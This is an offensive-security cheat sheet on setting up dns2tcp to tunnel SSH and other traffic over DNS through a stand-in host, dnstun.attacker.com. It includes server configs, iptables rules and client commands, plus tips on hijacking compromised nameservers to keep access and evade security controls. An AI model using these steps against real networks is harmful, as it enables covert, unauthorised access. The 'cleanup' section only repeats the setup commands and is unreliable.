# DNS2TCP

## Setup

### Package Manager

Install it according to your package manager.

```
$ sudo apt install -y dns2tcp

$ sudo yay -S --noconfirm dns2tcp-git
```

### Universal Install

```
$ git clone https://github.com/alex-sector/dns2tcp && cd dns2tcp \
./configure && make && sudo make install
```

## Server

> [!TIP] Hijack DNS Nameserver (OPSEC Consideration)
> Compromised DNS namserver can be used to maintain access and evade security endpoints due to it's legitimacy.

Once you've setup a domain nameserver for your own server. Perform a quick DNS network diagnostic to see if the subdomain is present.

```
$ dig NS <VPS_IP>
```

Once it's confirmed create a resource file to configure the server.

> [!INFO] Resource File
> You can create a temporary resource file (`.dsn2tcpdrc`) as well.

```
# cat >> /etc/dns2tcp.conf << EOF
listen = <LHOST>
port = 53
user = nobody
chroot = /tmp/
pid_file = /var/run/dns2tcp.pid
domain = subdomain.domain.tld
key = password123
resources = <resource>:
EOF
```

Here's an example of what it looks like.

```
# cat >> /etc/dns2tcp.conf << EOF
listen = 0.0.0.0
port = 53
user = nobody
chroot = /tmp/
pid_file = /var/run/dns2tcp.pid
domain = dnstun.attacker.com
key = password123
resources = ssh:127.0.0.1:22, smtp:127.0.0.1:25, socks:127.0.0.1:1082, https://127.0.0.1:8087, http://127.0.0.3128
EOF
```

Apply the configuration file for the service daemon to run in the foreground.

```
# dns2tcpd -F -d 3 -f /etc/dns2tcp.conf
```

> [!NOTE]
> This step isn't necessary unless your own VPS provider requires you to use firewall rules to open ports.

Create a firewall rule to route the DNS traffic.

```
# echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o dns0 -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i dns0 -o eth0 -j ACCEPT
```

Run the packet analyzer to listen for any incoming connections.

> [!NOTE]
> This step is also not necessary since you can just use the debug level (`-d`) to confirm that it is being tunneled.
> > [!TIP]
> > However, it can be used to monitor incoming traffic when deploying an automated script from the client-side.

```
# tcpdump -i eth0 udp port 53
```

## Client

> [!TIP] Establishing/Maintaining Access
> An automated script can be used to deploy with multiple subdomains of DNS nameservers to maintain access or establishing the initial foothold.

Check available resources to tunnel through DNS.

```
$ dns2tcpc -z subdomain.domain.tld <VPS_IP>
Available connection(s) :
		ssh
		smtp
```

Connect the DNS tunnel.

> [!INFO] Elevated Privileges Required
> Any listening ports ranging between **1-1023** must be ran as `root`.

```
$ dns2tcpc -c -k <password> -d <debug_level> -l <local_PORT> -r <resource> -z subdomain.domain.tld

$ dns2tcpc -c -k password123 -d 3 -l 2139 -r ssh -z dnstun.attacker.com
```

Even a resource file will work.

```
$ cat >> .dns2tcprc << EOF
domain = subdomain.domain.tld
resource = ssh
local_port = 2139
key = <password>
EOF

$ dns2tcpc -f .dns2tcprc
```

Connect through SSH.

```
$ ssh <username>@localhost -p 2139 -4fD 1080
```

## Cleanup and Revert Settings

### Remove Firewall Rules

TODO: Add a clean up section

```
# echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o dns0 -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i dns0 -o eth0 -j ACCEPT
```

### Remove Resource File

```
$ rm -f .dns2tcprc
```

---
## References

### Backlinks

- [[TCPDump]]

### Source Repositories

- [alex-sector: dns2tcp](https://github.com/alex-sector/dns2tcp)

- [debian: dns2tcp](https://salsa.debian.org/debian/dns2tcp)

### Kali Tools

- [Kali Tools: `dns2tcp`](https://www.kali.org/tools/dns2tcp/)

### Aldeid

- [Aldeid: DNS2TCP Usage Example](https://www.aldeid.com/wiki/Dns2tcp)

### DNS2TCP

- [dns2tcp: How to bypass firewalls or captive portals?](https://blog.rootshell.be/2007/03/22/dns2tcp-how-to-bypass-firewalls-or-captive-portals/)